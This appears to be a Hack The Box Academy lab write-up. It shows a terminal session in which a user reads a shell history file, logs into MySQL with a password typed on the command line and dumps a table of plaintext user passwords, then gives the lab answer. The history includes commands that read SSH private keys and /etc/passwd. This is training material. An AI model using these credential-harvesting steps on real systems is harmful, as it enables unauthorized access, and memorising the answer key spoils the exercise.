To check for new updates run: sudo apt update

Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$ ls -lah
total 52K
drwxr-xr-x 7 tom  tom  4.0K Jan 27 12:08 .
drwxr-xr-x 5 root root 4.0K Nov 10  2021 ..
-rw------- 1 tom  tom   532 Nov 10  2021 .bash_history
-rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tom  tom  3.7K Nov 10  2021 .bashrc
drwx------ 2 tom  tom  4.0K Nov 10  2021 .cache
drwxrwxr-x 3 tom  tom  4.0K Jan 27 12:08 .local
drwx------ 3 tom  tom  4.0K Nov 10  2021 mail
drwx------ 8 tom  tom  4.0K Jan 27 11:54 Maildir
-rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
-rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
drwx------ 2 tom  tom  4.0K Nov 10  2021 .ssh
-rw------- 1 tom  tom  2.0K Nov 10  2021 .viminfo
tom@NIXHARD:~$ cat .bash_history 
mysql -u tom -p
ssh-keygen -t rsa -b 4096
ls
ls -al
cd .ssh/
ls
cd mail/
ls
ls -al
cd .imap/
ls
cd Important/
ls
set term=xterm
vim key
cat ~/.ssh/id_rsa
vim key
ls
mv key ..
cd ..
ls
mv key Important/
mv Important/key ../
cd ..
ls
ls -l
id
cat /etc/passwd
ls
cd mail/
ls
ls -al
cd mail/
ls
rm Meetings 
rm TESTING Important 
ls -l
cd ..
ls -al
mv mail/key Maildir/.Important/new/
mv Maildir/.Important/new/key Maildir/new/
cd Maildir/new/
ls
cd ..
tree .
cat cur/key
cd cur/
ls
ls -al
cat "key:2,"
mysql -u tom -p 
mysql -u tom -p
tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from users;
+------+-------------------+------------------------------+
| id   | username          | password                     |
+------+-------------------+------------------------------+
|    1 | ppavlata0         | 6znAfvTbB2                   |
(...)
|  200 | mleidl5j          | qwfjY9RGk6                   |
+------+-------------------+------------------------------+
200 rows in set (0.00 sec)

mysql> select * from users where username = 'HTB';
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.00 sec)
```

**Answer:** `cr3n4o7rzse7rzhnckhssncif7ds`

---

**Tags:** [[Hack The Box Academy]]